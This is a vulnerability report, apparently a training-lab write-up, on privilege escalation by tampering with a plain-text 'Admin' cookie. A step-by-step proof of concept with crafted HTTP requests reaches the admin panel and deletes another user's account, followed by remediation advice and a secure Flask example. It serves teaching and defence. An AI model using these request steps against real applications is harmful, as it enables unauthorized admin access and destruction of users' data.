# Vulnerability Report: Privilege Escalation via Client-Side Cookie Parameter Tampering

* **Vulnerability Type:** Broken Access Control (CWE-269) / Insecure Direct Object Reference (CWE-639) / Improper Privilege Management (CWE-272)

* **Severity:** High

* **Target Component:** Authentication & Authorization Middleware (`Admin` Cookie Parameter)

* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

## 1. Executive Summary

A critical privilege escalation vulnerability was identified in the application's access control architecture. The application determines administrative access rights based on an unencrypted, user-modifiable HTTP cookie parameter (`Admin=false`). An authenticated non-privileged user can manipulate this value to `Admin=true` within their HTTP requests, effectively bypassing privilege checks and gaining full administrative access to sensitive management endpoints, including user account deletion features.

## 2. Technical Analysis & Root Cause

The vulnerability arises from trusting client-side state data to enforce server-side authorization boundaries.

### Vulnerability Mechanics

1. **Flawed Role Check Logic:** Upon receiving a request to `/admin`, the web application checks the HTTP `Cookie` header for the key-value pair `Admin=true`.

2. **Absence of Integrity Verification:** The cookie is stored as plain text without cryptographic signing (e.g., HMAC) or encryption. Consequently, the server cannot detect modifications made by the client.

3. **Decoupled Session State:** Role definitions are evaluated directly from incoming request attributes rather than querying a secure, server-side session store tied to the user's validated identity.

```
[ Authenticated User ]
          |
          | 1. Modifies Request Cookie: Admin=false -> Admin=true
          | 2. Issues Request: GET /admin
          v
[ Web Application Server ]
          |
          | 3. Reads Cookie ("Admin=true") -> Authorizes Request
          v
[ Administrative Dashboard Granted ]
```

## 3. Proof of Concept (PoC)

1. Authenticate to the application using standard user credentials (`wiener:peter`).

2. Intercept an authenticated request (e.g., `GET /myaccount?id=wiener`) using Burp Suite:

   ```http
   GET /myaccount?id=wiener HTTP/1.1
   Host: target-app.net
   Cookie: Admin=false; session=vX9z...
   ```

3. Send the request to **Burp Repeater**. Modify the target URL path to `/admin` and change the cookie parameter to `Admin=true`:

   ```http
   GET /admin HTTP/1.1
   Host: target-app.net
   Cookie: Admin=true; session=vX9z...
   ```

4. **Observe Response:** The server processes the request and returns `HTTP 200 OK`, displaying the administrative dashboard and user management controls.

5. Issue the user account deletion command targeting `carlos`:

   ```http
   GET /admin/delete?username=carlos HTTP/1.1
   Host: target-app.net
   Cookie: Admin=true; session=vX9z...
   ```

6. **Result:** The server executes the action without secondary verification, deleting user `carlos` and returning `HTTP 200 OK`.

## 4. Impact

* **Vertical Privilege Escalation:** Low-privileged users can instantly claim administrative rights.

* **Unauthorized Data Manipulation:** Administrative endpoints can be exploited to delete user accounts or alter critical application state.

* **Complete System Compromise:** Unrestricted control over administrative functions.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Server-Side Session Authorization:**
   Do not store role or authorization parameters on the client side. Store user roles exclusively in a secure server-side database or session store associated with the session ID.

2. **Cryptographically Signed Tokens:**
   If client-side state management is required (e.g., stateless microservices), use industry-standard signed tokens such as JSON Web Tokens (JWT) with strong signature verification algorithms (e.g., RS256 or HS256 with secret keys).

3. **Enforce Centralized Access Control Middleware:**
   Implement central authorization checks that derive permissions from the authenticated user context rather than parsing loose request headers.

#### Secure Code Implementation Example (Python / Flask)

```python
from flask import Flask, request, session, abort

app = Flask(__name__)

# Mock database lookup for user roles stored server-side
USER_ROLES_DB = {
    "wiener": "user",
    "admin_user": "admin"
}

@app.route('/admin/delete')
def delete_user():
    # Retrieve authenticated user identity from secure server-side session
    username = session.get('username')
    
    if not username:
        abort(401)  # Unauthorized
        
    # Verify role strictly from server-side records
    user_role = USER_ROLES_DB.get(username)
    if user_role != "admin":
        abort(403)  # Forbidden
        
    target_user = request.args.get('username')
    # Execute deletion logic safely
    return f"User {target_user} deleted successfully.", 200
```

## 6. References

* **CWE-269:** [Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
* **CWE-639:** [Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
* **OWASP:** [Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)